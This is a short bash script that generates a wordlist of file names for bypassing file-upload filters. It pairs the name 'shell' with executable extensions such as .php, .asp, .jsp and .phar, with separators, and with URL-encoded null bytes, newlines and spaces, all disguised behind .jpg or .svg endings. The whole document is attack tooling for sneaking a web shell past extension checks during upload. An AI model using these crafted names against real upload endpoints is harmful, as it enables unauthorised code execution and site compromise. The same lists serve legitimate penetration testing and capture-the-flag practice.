for char in '' '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.asp' '.aspx' '.bat' '.c' '.cfm' '.cgi' '.css' '.com' '.dll' '.exe' '.hta' '.htm' '.html' '.inc' '.jhtml' '.js' '.jsa' '.jsp' '.log' '.mdb' '.nsf' '.pcap' '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtml' '.svg' '.pl' '.phar' '.reg' '.sh' '.shtml' '.sql' '.swf' '.txt' '.xml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell$ext$char.svg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
